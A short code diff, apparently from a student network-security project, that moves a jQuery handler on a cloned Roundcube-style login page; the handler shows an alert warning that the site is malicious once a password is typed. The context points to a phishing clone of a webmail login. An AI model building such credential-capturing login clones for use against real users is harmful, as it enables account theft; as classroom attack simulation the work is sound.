@@ -371,17 +371,17 @@
             _pass: "pwd",
           },
         });
-
-        $("#rcmloginpwd").on("input", function () {
-          var pwd = $(this).val();
-
-          if (pwd.trim() !== "") {
-            // Show a custom prompt message when the user starts typing
-            alert("YOU ARE ENTERING YOUR CREDENTIALS ON A MALICIOUS WEBSITE. THIS ATTACK IS PART OF NETWORK AND SYSTEM SECURITY PROJECT. BE AWARE...");
-          }
-        });
-        
       });
+      $("#rcmloginpwd").on("input", function () {
+        var pwd = $(this).val();
+
+        if (pwd.trim() !== "") {
+          // Show a custom prompt message when the user starts typing
+          alert("YOU ARE ENTERING YOUR CREDENTIALS ON A MALICIOUS WEBSITE. THIS ATTACK IS PART OF NETWORK AND SYSTEM SECURITY PROJECT. BE AWARE...");
+        }
+      });
+        
+      
     </script>
   </body>
 </html>
